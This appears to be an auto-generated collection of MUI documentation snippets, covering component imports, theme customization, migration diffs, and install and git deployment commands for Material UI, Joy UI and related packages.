  System:
    OS: Linux 5.4 Ubuntu 20.04.1 LTS (Focal Fossa)
  Binaries:
    Node: 12.20.0 - ~/.nvm/versions/node/v12.20.0/bin/node
    Yarn: 1.22.4 - /usr/bin/yarn
    npm: 6.14.8 - ~/.nvm/versions/node/v12.20.0/bin/npm
  Browsers:
    Chrome: 87.0.4280.66
    Firefox: 83.0
  npmPackages:
    @emotion/react: ^11.0.0 => 11.1.1
    @emotion/styled: ^11.0.0 => 11.0.0
    @mui/codemod:  5.0.0-alpha.17
    @mui/material:  5.0.0-alpha.18
    @mui/docs:  5.0.0-alpha.1
    @mui/envinfo:  2.0.0
    @mui/icons-material:  5.0.0-alpha.15
    @mui/lab:  5.0.0-alpha.18
    @mui/styled-engine:  5.0.0-alpha.18
    @mui/styled-engine-sc:  5.0.0-alpha.18
    @mui/styles:  5.0.0-alpha.18
    @mui/system:  5.0.0-alpha.18
    @mui/types:  5.1.0
    @mui/base:  5.0.0-alpha.18
    @mui/utils:  5.0.0-alpha.18
    @types/react: ^17.0.0 => 17.0.0
    react: ^16.14.0 => 16.14.0
    react-dom: ^16.14.0 => 16.14.0
    styled-components:  5.2.1
    typescript: ^4.0.2 => 4.0.5

----------------------------------------

TITLE: Updating Grid2 Import and Props
DESCRIPTION: Examples of updating the Grid2 import and renaming size and offset props.

LANGUAGE: diff
CODE:
-import { Unstable_Grid2 as Grid2 } from '@mui/material';
+import { Grid2 } from '@mui/material';

LANGUAGE: diff
CODE:
-import Grid from '@mui/material/Unstable_Grid2';
+import Grid from '@mui/material/Grid2';

LANGUAGE: diff
CODE:
 <Grid
-  xs={12}
-  sm={6}
-  xsOffset={2}
-  smOffset={3}
+  size={{ xs: 12, sm: 6 }}
+  offset={{ xs: 2, sm: 3 }}
 >

LANGUAGE: diff
CODE:
-<Grid xs>
+<Grid size="grow">

----------------------------------------

TITLE: Simplified Styling in MUI X v5
DESCRIPTION: Shows the new simplified approach to styling GridToolbarContainer in MUI X v5 with reduced CSS specificity

LANGUAGE: jsx
CODE:
const GridToolbarContainerStyled = styled(GridToolbarContainer)({
  padding: 40,
});

function MyCustomToolbar() {
  return (
    <GridToolbarContainerStyled>
      My custom toolbar
    </GridToolbarContainer>
  );
};

export default function App() {
  return (
    <div style={{ height: 400, width: '100%' }}>
      <DataGrid components={{ Toolbar: MyCustomToolbar }} />
    </div>
  );
}

----------------------------------------

TITLE: Listing Available Scripts for MUI Internal Projects
DESCRIPTION: This snippet outlines the available scripts for building, testing, and publishing MUI projects. It includes commands for TypeScript transpilation, npm publishing (both live and dry-run), running tests, and type checking.

LANGUAGE: Markdown
CODE:
## Scripts

- `build` - transpiles TypeScript files into the build directory.
- `release:publish` - builds the project and publishes it in the npm registry.
- `release:publish:dry-run` - builds the project and publishes it in a local registry accessible on port 4873 (this is the default port of Verdaccio private npm server).
- `test` - runs all the tests.
- `typescript` - checks validity of types.

----------------------------------------

TITLE: Implementing Warning Callout in MUI
DESCRIPTION: Illustrates how to create a warning callout with formatted text, code, and links. This callout is used to highlight potential issues or important details to keep in mind.

LANGUAGE: markup
CODE:
:::warning
This is a warning callout.
It says, "Be careful! Keep this detail in mind to avoid potential issues."

- emphasised: **bold text**
- some code `<div/>`
- a [link](#link).
:::

----------------------------------------

TITLE: TypeScript Module Augmentation for Custom Breakpoints
DESCRIPTION: Shows how to set up module augmentation in TypeScript to support custom breakpoints in the theme interface.

LANGUAGE: TypeScript
CODE:
declare module '@mui/system' {
  interface BreakpointOverrides {
    // Your custom breakpoints
    laptop: true;
    tablet: true;
    mobile: true;
    desktop: true;
    // Remove default breakpoints
    xs: false;
    sm: false;
    md: false;
    lg: false;
    xl: false;
  }
}

----------------------------------------

TITLE: Using Theme Context with makeStyles in React
DESCRIPTION: Shows how to use makeStyles with ThemeProvider to access theme values in component styles.

LANGUAGE: jsx
CODE:
import { makeStyles } from '@mui/styles';
import { createTheme, ThemeProvider } from '@mui/material/styles';

const theme = createTheme();

const useStyles = makeStyles((theme) => ({
  root: {
    color: theme.palette.primary.main,
  }
}));

const App = (props) => {
  const classes = useStyles();
  return <ThemeProvider theme={theme}><div {...props} className={classes.root}></ThemeProvider>;
}

----------------------------------------

TITLE: Importing Badge Component in React
DESCRIPTION: Import statement for the Badge component, which can be used in combination with Avatar to show additional status information.

LANGUAGE: jsx
CODE:
import Badge from '@mui/joy/Badge';

----------------------------------------

TITLE: Creating Interactive List Items in React
DESCRIPTION: Import statement for ListItemButton component used to make list items interactive.

LANGUAGE: jsx
CODE:
import ListItemButton from '@mui/joy/ListItemButton';

----------------------------------------

TITLE: Material UI Peer Dependencies
DESCRIPTION: JSON snippet showing the peer dependencies for Material UI, including React and ReactDOM version requirements.

LANGUAGE: json
CODE:
"peerDependencies": {
  "react": "^17.0.0 || ^18.0.0 || ^19.0.0",
  "react-dom": "^17.0.0 || ^18.0.0 || ^19.0.0"
}

----------------------------------------

TITLE: Installing Joy UI and Dependencies with npm
DESCRIPTION: This command installs Joy UI and its required Emotion dependencies using npm. It should be run in the project directory to add Joy UI to your React project.

LANGUAGE: bash
CODE:
npm install @mui/joy @emotion/react @emotion/styled

----------------------------------------

TITLE: Adding old font weight scale to theme
DESCRIPTION: Code to add the removed font weights back to the Joy UI theme.

LANGUAGE: javascript
CODE:
extendTheme({
  fontWeight: {
    xs: 200,
    xl2: 800,
    xl3: 900,
  },
});

----------------------------------------

TITLE: Running Theme-related Codemods
DESCRIPTION: Commands to run codemods for migrating to theme.applyStyles().

LANGUAGE: bash
CODE:
npx @mui/codemod@latest v6.0.0/styled <path/to/folder-or-file>
npx @mui/codemod@latest v6.0.0/sx-prop <path/to/folder-or-file>
npx @mui/codemod@latest v6.0.0/theme-v6 <path/to/theme-file>

----------------------------------------

TITLE: HTML Image Reference with Styling
DESCRIPTION: Logo and title section of the README using HTML for center alignment and image display with specific dimensions.

LANGUAGE: HTML
CODE:
<p align="center">
  <a href="https://next.mui.com/core/" rel="noopener" target="blank"><img width="150" height="133" src="https://mui.com/static/logo.svg" alt="Material UI logo"></a>
</p>

<h1 align="center">Material UI</h1>

----------------------------------------

TITLE: Enabling Header Filters in Data Grid
DESCRIPTION: This code snippet shows how to enable filtering on column headers in the MUI X Data Grid. It uses the 'unstable_headerFilters' prop to activate this feature, and optionally disables the default filter panel.

LANGUAGE: TSX
CODE:
<DataGrid
  unstable_headerFilters
  disableColumnFilter // Optional: disables the default filter panel
  // ... other props
/>

----------------------------------------

TITLE: TypeScript Custom Component Usage
DESCRIPTION: Examples of using TypeScript with custom components and primitive elements in TablePagination.

LANGUAGE: tsx
CODE:
<TablePagination<typeof CustomComponent>
  slots={{ root: CustomComponent }}
  customProp
/>

LANGUAGE: tsx
CODE:
<TablePagination<'button'> slots={{ root: 'button' }} onClick={() => {}} />

----------------------------------------

TITLE: Custom Breakpoints in Grid
DESCRIPTION: Illustrates how to use custom breakpoint names as grid item props in responsive values when custom breakpoints are specified in the theme.

LANGUAGE: JavaScript
CODE:
{"demo": "CustomBreakpointsGrid.js", "bg": true}

----------------------------------------

TITLE: Creating CSS Grid Layout with MUI Box Component
DESCRIPTION: This snippet illustrates how to use MUI's Box component to create a CSS Grid layout, providing an alternative to the traditional Grid component for more complex layouts.

LANGUAGE: jsx
CODE:
<Box display="grid" gridTemplateColumns="repeat(12, 1fr)" gap={2}>
  <Box gridColumn="span 8">
    <Item>xs=8</Item>
  </Box>
  <Box gridColumn="span 4">
    <Item>xs=4</Item>
  </Box>
  <Box gridColumn="span 4">
    <Item>xs=4</Item>
  </Box>
  <Box gridColumn="span 8">
    <Item>xs=8</Item>
  </Box>
</Box>

----------------------------------------

TITLE: Using Dynamic Styles with makeStyles Hook
DESCRIPTION: Demonstrates how to create dynamic styles using props with the makeStyles hook in Material UI v4

LANGUAGE: JSX
CODE:
const useStyles = makeStyles({
  // style rule
  foo: (props) => ({
    backgroundColor: props.backgroundColor,
  }),
  bar: {
    // CSS property
    color: (props) => props.color,
  },
});

function MyComponent() {
  // Simulated props for the purpose of the example
  const props = {
    backgroundColor: 'black',
    color: 'white',
  };
  // Pass the props as the first argument of useStyles()
  const classes = useStyles(props);

  return <div className={`${classes.foo} ${classes.bar}`} />;
}

----------------------------------------

TITLE: Migrating styled components with dynamic props
DESCRIPTION: Demonstration of how to migrate styled components that use dynamic props to work with Pigment CSS by using CSS variables.

LANGUAGE: javascript
CODE:
const FlashCodeRoot = styled('div')(({ theme }) => ({
  top: `calc(var(--Flashcode-lineHeight) * 1.5 * var(--Flashcode-startLine))`,
  height: `calc(var(--Flashcode-lineHeight) * 1.5 * (var(--Flashcode-endLine) - var(--Flashcode-startLine) + 1))`,
  ...theme.typography.caption,
}));

const FlashCode = React.forwardRef(function FlashCode(props, ref) {
  const {
    children,
    startLine = 0,
    endLine = startLine,
    lineHeight = '0.75rem',
    ...other
  } = props;

  return (
    <FlashCodeRoot
      ref={ref}
      {...other}
      style={{
        '--Flashcode-lineHeight': lineHeight,
        '--Flashcode-startLine': startLine,
        '--Flashcode-endLine': endLine,
        ...other.style,
      }}
    >
      {children}
    </FlashCodeRoot>
  );
});

export default FlashCode;

----------------------------------------

TITLE: Configuring Shadow Ring for Light/Dark Modes
DESCRIPTION: Example of configuring shadow ring appearance for both light and dark color schemes in Joy UI theme.

LANGUAGE: javascript
CODE:
import { extendTheme } from '@mui/joy/styles';

const theme = extendTheme({
  colorSchemes: {
    light: {
      shadowRing: '0 0 0 1px rgba(0 0 0 / 0.1)',
    },
    dark: {
      shadowChannel: '0 0 0 1px rgba(255 255 255 / 0.1)',
    },
  },
});

----------------------------------------

TITLE: Importing AvatarGroup Component in React
DESCRIPTION: Import statement for the AvatarGroup component, used to group multiple Avatars together.

LANGUAGE: jsx
CODE:
import AvatarGroup from '@mui/joy/AvatarGroup';

----------------------------------------

TITLE: Basic Breadcrumbs Import - React/JSX
DESCRIPTION: Basic import statement for the Breadcrumbs component from MUI Joy UI library.

LANGUAGE: jsx
CODE:
import Breadcrumbs from '@mui/joy/Breadcrumbs';

----------------------------------------

TITLE: TypeScript Usage with createStyles
DESCRIPTION: Shows how to use createStyles helper function with TypeScript to construct style rules object and defeat type widening issues.

LANGUAGE: typescript
CODE:
// Non-dependent styles
const styles = createStyles({
  root: {
    display: 'flex',
    flexDirection: 'column',
  },
});

// Theme-dependent styles
const styles = ({ palette, spacing }: Theme) =>
  createStyles({
    root: {
      display: 'flex',
      flexDirection: 'column',
      padding: spacing.unit,
      backgroundColor: palette.background.default,
      color: palette.primary.main,
    },
  });

----------------------------------------

TITLE: Customizing Joy UI Components with Theme Overrides
DESCRIPTION: Demonstrates how to use component identifiers to customize default props and style overrides for Joy UI components in the theme configuration.

LANGUAGE: javascript
CODE:
import { CssVarsProvider, extendTheme } from '@mui/joy/styles';

const theme = extendTheme({
  components: {
    JoyChip: {
      defaultProps: {
        size: 'sm',
      },
      styleOverrides: {
        root: {
          borderRadius: '4px',
        },
      },
    },
  },
});

function App() {
  return <CssVarsProvider theme={theme}>...</CssVarsProvider>;
}

----------------------------------------

TITLE: Customizing Global Variants in Joy UI Theme (JavaScript)
DESCRIPTION: This code snippet demonstrates how to customize global variant tokens within the Joy UI theme configuration. It shows the structure for defining color schemes, palettes, and specific variant properties for both light and dark modes.

LANGUAGE: javascript
CODE:
{
  colorSchemes: {
    light: {
      palette: {
        primary: {
          solidBg: 'var(--joy-palette-primary-600)',       // the initial background
          solidColor: '#fff',                              // the initial color
          solidHoverBg: 'var(--joy-palette-primary-700)',  // the :hover background
          solidActiveBg: 'var(--joy-palette-primary-800)', // the :active background
          // ...other tokens
        },
        neutral: {
          solidBg: 'var(--joy-palette-primary-700)',
          solidColor: '#fff',
          solidHoverBg: 'var(--joy-palette-primary-800)',
          solidActiveBg: 'var(--joy-palette-primary-900)',
          // ...other tokens
        },
        // ...other palettes
      }
    },
    dark: {
      palette: {
        // similar structure but different values
      }
    },
  }
}

----------------------------------------

TITLE: Installing MUI Base via npm
DESCRIPTION: Command to install the MUI Base package using npm package manager.

LANGUAGE: bash
CODE:
npm install @mui/base

----------------------------------------

TITLE: FormControl Nesting Example
DESCRIPTION: Demonstrates potential issues with nested form components in Material UI.

LANGUAGE: jsx
CODE:
<FormControl>
  <TextField>
</FormControl>

// Equivalent to

<FormControl>
  <FormControl>
    <InputLabel />
    <Input />
    <FormHelperText />
  </FormControl>
</FormControl>

----------------------------------------

TITLE: Creating a custom unstyled button in React
DESCRIPTION: Example of using the useButton hook to create a custom unstyled button component

LANGUAGE: typescript
CODE:
const CustomButton = React.forwardRef(function CustomButton(
  props: ButtonUnstyledProps,
  ref: React.ForwardedRef<any>,
) {
  const { children } = props;
  const { active, disabled, focusVisible, getRootProps } = useButton({
    ...props,
    ref,
    component: CustomButtonRoot,
  });

  const classes = {
    active,
    disabled,
    focusVisible,
  };

  return (
    <CustomButtonRoot {...getRootProps()} className={clsx(classes)}>
      {children}
    </CustomButtonRoot>
  );
});

----------------------------------------

TITLE: TypeScript Interface Augmentation for MUI Theme
DESCRIPTION: TypeScript interface augmentation for adding custom tokens to the theme palette

LANGUAGE: ts
CODE:
declare module '@mui/material/styles' {
  interface PaletteOptions {
    gradient: string;
    border: {
      subtle: string;
    };
  }
  interface Palette {
    gradient: string;
    border: {
      subtle: string;
    };
  }
}

----------------------------------------

TITLE: Importing Basic Tabs Components - React/JSX
DESCRIPTION: Basic imports required for using the Material UI Tabs components.

LANGUAGE: jsx
CODE:
import Tabs from '@mui/material/Tabs';
import Tab from '@mui/material/Tab';

----------------------------------------

TITLE: Importing useSlider Hook
DESCRIPTION: Import statement for the useSlider hook from MUI Base.

LANGUAGE: js
CODE:
import { useSlider } from '@mui/base/useSlider';

----------------------------------------

TITLE: Mixed String Values Spacing
DESCRIPTION: Shows how to combine numeric spacing values with string values

LANGUAGE: javascript
CODE:
margin: theme.spacing(1, 'auto'), // '8px auto'

----------------------------------------

TITLE: Rendering List as Semantic HTML Element
DESCRIPTION: Example of rendering the List component as an HTML ordered list element using the component prop.

LANGUAGE: jsx
CODE:
<List component="ol">

----------------------------------------

TITLE: Implementing Fluid Container in React MUI
DESCRIPTION: Creates a fluid container with maximum width constraints. The container width is bounded by the maxWidth prop value while still being responsive.

LANGUAGE: jsx
CODE:
<Container maxWidth="sm">

----------------------------------------

TITLE: Implementing Forward Ref Component with Proper Prop Ordering
DESCRIPTION: Shows the correct implementation of a component using the forwardRef shim with proper prop spreading order.

LANGUAGE: typescript
CODE:
const GridRoot = forwardRef((props, ref) => {
  const state = useGridState();
  return <div {...props} {...state} ref={ref} />;
});

----------------------------------------

TITLE: Importing FocusTrap from MUI Base
DESCRIPTION: This code snippet demonstrates how to import the FocusTrap component from MUI Base.

LANGUAGE: JavaScript
CODE:
import { FocusTrap } from '@mui/base/FocusTrap';

----------------------------------------

TITLE: Cherry-picking Commits for Deployment
DESCRIPTION: This bash command cherry-picks a specific commit to include in the new deployment. Replace <commit> with the actual commit hash.

LANGUAGE: bash
CODE:
git cherry-pick <commit>

----------------------------------------

TITLE: Implementing Success Callout in MUI
DESCRIPTION: Shows how to create a success callout with formatted text, code, and links. This callout is used to provide actionable suggestions for success.

LANGUAGE: markup
CODE:
:::success
This is a success callout.
It says, "Here's an actionable suggestion to help you succeed."

- emphasised: **bold text**
- some code `<div/>`
- a [link](#link).
:::

----------------------------------------

TITLE: Implementing Info Callout in MUI
DESCRIPTION: Demonstrates how to create an info callout with formatted text, code, and links. This callout is used to provide additional insights or explanations about a feature.

LANGUAGE: markup
CODE:
:::info
This is an info callout.
It says, "Here's a bit of extra insight to help you understand this feature."

- emphasised: **bold text**
- some code `<div/>`
- a [link](#link).
:::

----------------------------------------

TITLE: Animating Skeleton Component in React
DESCRIPTION: This code shows how to implement the new 'wave' animation for the Skeleton component in React. The Skeleton component is used for displaying placeholder content while data is loading.

LANGUAGE: jsx
CODE:
<video style="max-height: 95px; margin-bottom: 24px;" autoplay muted loop playsinline>
  <source src="/static/blog/2020-q1-update/skeleton.webm" type="video/webm" />
</video>

----------------------------------------

TITLE: Adjusting ref type specificity for components
DESCRIPTION: Use specific element types for refs to avoid type errors with certain components.

LANGUAGE: diff
CODE:
 import * as React from 'react';
 import Card from '@mui/material/Card';
 import ListItem from '@mui/material/ListItem';

 export default function SpecificRefType() {
-  const cardRef = React.useRef<HTMLElement>(null);
+  const cardRef = React.useRef<HTMLDivElement>(null);

-  const listItemRef = React.useRef<HTMLElement>(null);
+  const listItemRef = React.useRef<HTMLLIElement>(null);
   return (
     <div>
       <Card ref={cardRef}></Card>
       <ListItem ref={listItemRef}></ListItem>
     </div>
   );
 }

----------------------------------------

TITLE: Importing usePagination Hook - React/MUI
DESCRIPTION: Example of importing and using the usePagination hook from Material-UI for advanced pagination customization. This hook provides pagination functionality without the default UI rendering.

LANGUAGE: jsx
CODE:
import usePagination from '@mui/material/usePagination';

----------------------------------------

TITLE: Disabling Portal for Popup in React
DESCRIPTION: Demonstrates how to render the Popup without using React portals by passing the 'disablePortal' prop. It also mentions using the 'strategy' prop to prevent clipping issues.

LANGUAGE: jsx
CODE:
{"demo": "DisabledPortalPopup.js"}

----------------------------------------

TITLE: Defining CSS Style Variants in JavaScript
DESCRIPTION: Example demonstrating how to structure CSS classes for component variants with proper specificity

LANGUAGE: js
CODE:
const styles = {
  root: {
    color: green[600],
    '&$checked': {
      color: green[500],
    },
  },
  checked: {},
};

----------------------------------------

TITLE: Menu Import for Breadcrumbs - React/JSX
DESCRIPTION: Import statement for the Menu component used in advanced breadcrumb implementations with dropdowns.

LANGUAGE: jsx
CODE:
import Menu from '@mui/joy/Menu';

----------------------------------------

TITLE: Controlling Print Display with MUI Box Component in JSX
DESCRIPTION: Shows how to control element visibility for screen and print using MUI Box component. One element is hidden in print, while the other is only visible in print.

LANGUAGE: jsx
CODE:
<Box sx={{ display: 'block', displayPrint: 'none' }}>
  Screen Only (Hide on print only)
</Box>
<Box sx={{ display: 'none', displayPrint: 'block' }}>
  Print Only (Hide on screen only)
</Box>

----------------------------------------

TITLE: Using MUI Slider Component in React
DESCRIPTION: This example demonstrates how to import and use the MUI Slider component in a React application. It shows two sliders, one with default styling and another with a custom CSS class.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import Slider from '@mui/material/Slider';
import './PlainCssSliderDeep1.css';

export default function PlainCssSliderDeep1() {
  return (
    <div>
      <Slider defaultValue={30} />
      <Slider defaultValue={30} className="slider" />
    </div>
  );
}

----------------------------------------

TITLE: Installing MUI and Emotion Dependencies with Package Managers
DESCRIPTION: This snippet shows how to install MUI and its peer dependencies (Emotion) using npm, pnpm, and yarn. It emphasizes that @emotion/react and @emotion/styled are required peer dependencies.

LANGUAGE: bash
CODE:
npm install @mui/material @emotion/react @emotion/styled
# `@emotion/react` and `@emotion/styled` are peer dependencies

LANGUAGE: bash
CODE:
pnpm add @mui/material @emotion/react @emotion/styled
# `@emotion/react` and `@emotion/styled` are peer dependencies

LANGUAGE: bash
CODE:
yarn add @mui/material @emotion/react @emotion/styled
# `@emotion/react` and `@emotion/styled` are peer dependencies

----------------------------------------

TITLE: Customizing Base UI Components with slots and slotProps Props
DESCRIPTION: Demonstrates how to use the slots and slotProps props to customize Base UI components, including examples for Select and Badge components.

LANGUAGE: tsx
CODE:
// Example of the slots prop
<Select slots={{ listbox: 'ol' }} defaultValue="First option">
  <Option value="First option">First option</Option>
  <Option value="Second option">Second option</Option>
</Select>

// Example of the slotProps prop
<Badge slotProps={{ badge: { className: 'my-badge' } }} />

----------------------------------------

TITLE: Importing Inter Font in React
DESCRIPTION: TypeScript/React code to import the Inter font from Fontsource in the application entry point.

LANGUAGE: tsx
CODE:
import '@fontsource/inter';

----------------------------------------

TITLE: Button Group with Custom Spacing - React
DESCRIPTION: Example demonstrating how to control spacing between buttons using the spacing prop with responsive values.

LANGUAGE: jsx
CODE:
<ButtonGroup spacing={{ xs: 0, sm: 1, md: '2rem' }}>...</ButtonGroup>

----------------------------------------

TITLE: Customizing Material UI Button Component with styled() in TypeScript
DESCRIPTION: Example of using the styled() utility to customize a Material UI Button component in TypeScript. This approach requires casting the resulting component to maintain proper typing.

LANGUAGE: tsx
CODE:
import Button from '@mui/material/Button';
import { styled } from '@mui/material/styles';

const CustomButton = styled(Button)({
  // your custom styles go here
}) as typeof Button;

----------------------------------------

TITLE: Implementing Box Shadows with MUI Components
DESCRIPTION: Demonstrates how to apply different elevation levels using the boxShadow prop in MUI Box components. The system supports 25 elevation levels by default, ranging from 0 (no shadow) to 24 (maximum shadow).

LANGUAGE: jsx
CODE:
<Box sx={{ boxShadow: 0 }}>…
<Box sx={{ boxShadow: 1 }}>…
<Box sx={{ boxShadow: 2 }}>…
<Box sx={{ boxShadow: 3 }}>…

----------------------------------------

TITLE: HTML Structure for Tabs Components
DESCRIPTION: This snippet illustrates the basic HTML structure generated by the Tabs components, showing the root elements and their relationships.

LANGUAGE: html
CODE:
<div class="Tabs-root">
  <div class="TabsList-root">
    <button class="Tab-root">First tab</button>
    <button class="Tab-root">Second tab</button>
    <button class="Tab-root">Third tab</button>
  </div>
  <div class="TabPanel-root">First panel</div>
  <div class="TabPanel-root">Second panel</div>
  <div class="TabPanel-root">Third panel</div>
</div>

----------------------------------------

TITLE: Importing Button Component - React/JSX
DESCRIPTION: Basic import statement for the Joy UI Button component

LANGUAGE: jsx
CODE:
import Button from '@mui/joy/Button';

----------------------------------------

TITLE: Event Handler Factory Implementation
DESCRIPTION: Shows how to create event handler factories that support external handler integration and cancellation via defaultMuiPrevented.

LANGUAGE: typescript
CODE:
const createHandleKeyDown = (otherHandlers: EventHandlers) => (event: React.KeyboardEvent & MuiCancellableEvent) => {
  // Run the external handler first.
  // It can potentially set the defaultMuiPrevented field.
  otherHandlers.onKeyDown?.(event);

  // If the field is set, do not execute the usual handler logic.
  if (event.defaultMuiPrevented) {
    return;
  }

  // handler-specific logic...

----------------------------------------

TITLE: Internal Component Interface Definition
DESCRIPTION: Demonstrates interface definition for internal components with optional class support.

LANGUAGE: typescript
CODE:
export interface BarClasses {
  root: string;
}

export interface BarProps {
  classes?: Partial<BarClasses>;
  sx?: SxProps<Theme>;
}

----------------------------------------

TITLE: Serving Visual Regression Test Fixture Bundle
DESCRIPTION: This command serves the webpack bundle containing the visual regression test fixtures.

LANGUAGE: bash
CODE:
pnpm test:regressions:server

----------------------------------------

TITLE: Updating Typography Color Prop
DESCRIPTION: Example of updating the color prop usage in Typography component.

LANGUAGE: diff
CODE:
-<Typography color={(theme) => theme.palette.primary.main}>
+<Typography sx={{ color: (theme) => theme.palette.primary.main }}>

----------------------------------------

TITLE: Installing RTL Styling Plugin
DESCRIPTION: Package installation commands for stylis-plugin-rtl using different package managers

LANGUAGE: bash
CODE:
npm install stylis stylis-plugin-rtl

LANGUAGE: bash
CODE:
pnpm add stylis stylis-plugin-rtl

LANGUAGE: bash
CODE:
yarn add stylis stylis-plugin-rtl

----------------------------------------

TITLE: Installing MUI Lab Package via npm
DESCRIPTION: Command to install the @mui/lab package using npm. This installs the next (latest) version of the package.

LANGUAGE: bash
CODE:
npm install @mui/lab@next

----------------------------------------

TITLE: Basic CSS Customization for Material UI Switch
DESCRIPTION: Demonstrates how to customize a Material UI Switch component using CSS specificity rules to override default styles.

LANGUAGE: jsx
CODE:
<Switch className="uglySwitch" />

LANGUAGE: css
CODE:
/* two classes are more specific than the default single class selector */
.uglySwitch .MuiSwitch-thumb {
  background-color: green;
}

.uglySwitch .MuiTouchRipple-root {
  border: 2px solid red;
}

.uglySwitch .MuiSwitch-track {
  background-color: orange;
  opacity: 1;
}

----------------------------------------

TITLE: Adding Dividers to Lists in React
DESCRIPTION: Import statement for ListDivider component used to separate list items with various inset patterns.

LANGUAGE: jsx
CODE:
import ListDivider from '@mui/joy/ListDivider';

----------------------------------------

TITLE: Managing Overflow with MUI Box Component in JSX
DESCRIPTION: Demonstrates how to handle overflow using MUI Box component. One example hides overflow, while the other allows scrolling with overflow: auto.

LANGUAGE: jsx
CODE:
<Box component="div" sx={{ overflow: 'hidden' }}>
  Not scrollable, overflow is hidden
</Box>
<Box component="div" sx={{ overflow: 'auto' }}>
  Try scrolling this overflow auto box
</Box>

----------------------------------------

TITLE: Function-based Spacing Theme
DESCRIPTION: Illustrates spacing transformation when theme.spacing is a function. The function is called with the prop value to calculate spacing.

LANGUAGE: jsx
CODE:
const theme = {
  spacing: value => value * 2,
}

<Box sx={{ m: 0 }} /> // margin: 0px;
<Box sx={{ m: 2 }} /> // margin: 4px;

----------------------------------------

TITLE: Utility Class Generation for Public Components
DESCRIPTION: Shows how to create utility class generators and compose classes for public components with proper typing.

LANGUAGE: typescript
CODE:
export function getFooUtilityClass(slot: string) {
  return generateUtilityClass('MuiFoo', slot);
}

const useUtilityClasses = (ownerState: FooProps & { extraProp: boolean }) => {
  const { foo, disabled, classes } = ownerState;

  const slots = {
    root: ['root', foo && 'foo', disabled && 'disabled'],
  };

  return composeClasses(slots, getFooUtilityClass, classes);
};

----------------------------------------

TITLE: Adding Icons to React Chips
DESCRIPTION: Illustrates how to add icons to Chip components using the icon prop.

LANGUAGE: JSX
CODE:
{"demo": "IconChips.js"}

----------------------------------------

TITLE: Adding Icons to React Chips
DESCRIPTION: Illustrates how to add icons to Chip components using the icon prop.

LANGUAGE: JSX
CODE:
{"demo": "IconChips.js"}

----------------------------------------

TITLE: Demonstrating Basic Material UI Button Component in React
DESCRIPTION: This snippet shows a basic Material UI app featuring a Button component. It demonstrates how to use the Button component and suggests trying different variants.

LANGUAGE: JavaScript
CODE:
{"demo": "../usage/ButtonUsage.js", "defaultCodeOpen": true}

----------------------------------------

TITLE: Importing ModalClose Component for Drawer in React
DESCRIPTION: This snippet demonstrates how to import the ModalClose component, which can be used to add a close button to the Drawer. The ModalClose component automatically handles the onClick event.

LANGUAGE: jsx
CODE:
import ModalClose from '@mui/joy/ModalClose';

----------------------------------------

TITLE: Creating Base Media Player Component with Tailwind CSS
DESCRIPTION: Initial implementation of the Player component using Tailwind CSS classes for styling. Includes markup for the media player interface with album artwork, progress bar, and control buttons.

LANGUAGE: tsx
CODE:
import * as React from 'react';

const Player = React.forwardRef(function Player(
  props: { className?: string },
  ref: React.ForwardedRef<HTMLDivElement>,
) {
  const { className = '', ...other } = props;
  return (
    <div
      className={`max-w-[600px] max-h-[240px] m-auto ${className}`}
      {...other}
      ref={ref}
    >
      <div className="bg-white border-slate-100 dark:bg-slate-800 dark:border-slate-500 border-b rounded-t-xl p-4 pb-6 sm:p-10 sm:pb-8 lg:p-6 xl:p-10 xl:pb-8 space-y-6 sm:space-y-8 lg:space-y-6 xl:space-y-8">
        {/* Component content */}
      </div>
    </div>
  );
});

export default Player;

----------------------------------------

TITLE: Installing MUI System with yarn
DESCRIPTION: Command to install MUI System and its Emotion dependencies using yarn package manager

LANGUAGE: bash
CODE:
yarn add @mui/system @emotion/react @emotion/styled

----------------------------------------

TITLE: Applying CSS Variables with sx prop in Joy UI
DESCRIPTION: This snippet demonstrates how to use the theme.vars.* notation with the sx prop for styling components.

LANGUAGE: jsx
CODE:
// Outputs 'var(--joy-shadow-sm)'
<Chip sx={(theme) => ({ boxShadow: theme.vars.shadow.sm })} />

----------------------------------------

TITLE: Updating Theme Palette augmentColor Usage
DESCRIPTION: Use the returned value from theme.palette.augmentColor() instead of relying on side effects.

LANGUAGE: diff
CODE:
-const background = { main: color };
-theme.palette.augmentColor(background);
+const background = theme.palette.augmentColor({ main: color });

 console.log({ background });

----------------------------------------

TITLE: Importing Stepper Components in React
DESCRIPTION: This snippet shows how to import the basic Stepper and Step components from Joy UI. These are the fundamental building blocks for creating stepper interfaces.

LANGUAGE: jsx
CODE:
import Stepper from '@mui/joy/Stepper';
import Step from '@mui/joy/Step';

----------------------------------------

TITLE: Pushing Changes to Material-UI Docs Remote
DESCRIPTION: This bash command pushes the current HEAD to the latest branch of the material-ui-docs remote repository.

LANGUAGE: bash
CODE:
git push material-ui-docs HEAD:latest

----------------------------------------

TITLE: Switching Back to Previous Branch
DESCRIPTION: This bash command switches back to the previously checked out branch after deploying documentation changes.

LANGUAGE: bash
CODE:
git checkout -

----------------------------------------

TITLE: Importing Card Component - React/JSX
DESCRIPTION: Basic import statement for the Card component from MUI Joy UI library

LANGUAGE: jsx
CODE:
import Card from '@mui/joy/Card';

----------------------------------------

TITLE: Importing Grid Components in Material UI
DESCRIPTION: Shows how to import both legacy (v1) and new (v2) Grid components from Material UI

LANGUAGE: javascript
CODE:
import Grid from '@mui/material/GridLegacy'; // The legacy grid, a.k.a. Grid v1
import Grid from '@mui/material/Grid'; // The updated grid, a.k.a. Grid v2

----------------------------------------

TITLE: Justify Content Properties in MUI Box
DESCRIPTION: Examples of different justify-content alignments in MUI Box components.

LANGUAGE: jsx
CODE:
<Box sx={{ justifyContent: 'flex-start' }}>…
<Box sx={{ justifyContent: 'flex-end' }}>…
<Box sx={{ justifyContent: 'center' }}>…
<Box sx={{ justifyContent: 'space-between' }}>…
<Box sx={{ justifyContent: 'space-around' }}>…
<Box sx={{ justifyContent: 'space-evenly' }}>…

----------------------------------------

TITLE: Using the sx prop in React
DESCRIPTION: Example of using the new sx prop for inline styling on MUI components

LANGUAGE: jsx
CODE:
// add margin: 8px 0px;
<Slider sx={{ my: 1 }} />

----------------------------------------

TITLE: Updating theme variants in Material UI v5
DESCRIPTION: Example of moving custom component variants to the styleOverrides.root section of the theme

LANGUAGE: JavaScript
CODE:
 createTheme({
   components: {
     MuiButton: {
-      variants: [ ... ],
+      styleOverrides: {
+        root: {
+          variants: [ ... ],
+        },
+      },
     },
   },
 });

----------------------------------------

TITLE: Implementing Nested Lists with Subheaders
DESCRIPTION: Import statement for ListSubheader component used in creating nested lists with subheaders.

